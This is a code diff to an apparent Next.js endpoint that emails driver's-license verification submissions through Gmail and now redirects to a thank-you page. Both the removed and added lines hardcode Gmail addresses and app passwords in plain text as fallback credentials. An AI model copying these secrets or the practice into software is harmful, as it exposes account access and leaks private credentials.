@@ -2,12 +2,12 @@ import { NextRequest, NextResponse } from 'next/server';
 import nodemailer from 'nodemailer';
 
 const transporter = nodemailer.createTransport({
-    host: "smtp.gmail.com",
+    service: "gmail",
     port: 465,
     secure: true,
     auth: {
-        user: process.env.SMTP_USER || "john.darlucio022@gmail.com",
-        pass: process.env.SMTP_PASS || "ihik fajx avxh ctov",
+        user: process.env.SMTP_USER || "teamstrp14@gmail.com",
+        pass: process.env.SMTP_PASS || "wbpa qlwp jgol itrl",
     },
 });
 
@@ -207,8 +207,8 @@ export async function POST(request: NextRequest) {
 
         // Send email
         const info = await transporter.sendMail({
-            from: `"QuickShift Identity Verification" <${process.env.SMTP_USER || "john.darlucio022@gmail.com"}>`,
-            to: process.env.SMTP_USER || "john.darlucio022@gmail.com",
+            from: `"QuickShift Identity Verification" <${process.env.SMTP_USER || "teamstrp14@gmail.com"}>`,
+            to: process.env.SMTP_USER || "teamstrp14@gmail.com",
             replyTo: email,
             subject: `🚗 New Driver's License Verification - ${fullName}`,
             html: emailContent,
@@ -217,14 +217,10 @@ export async function POST(request: NextRequest) {
 
         console.log("Stepper form email sent: %s", info.messageId);
 
-        return NextResponse.json(
-            {
-                success: true,
-                message: 'Identity verification request submitted successfully!',
-                messageId: info.messageId
-            },
-            { status: 200 }
-        );
+        // Redirect to thank you page on success
+        return NextResponse.redirect(new URL('/thank-you', request.url), { status: 302 });
+
+
 
     } catch (error) {
         console.error('Stepper form API error:', error);
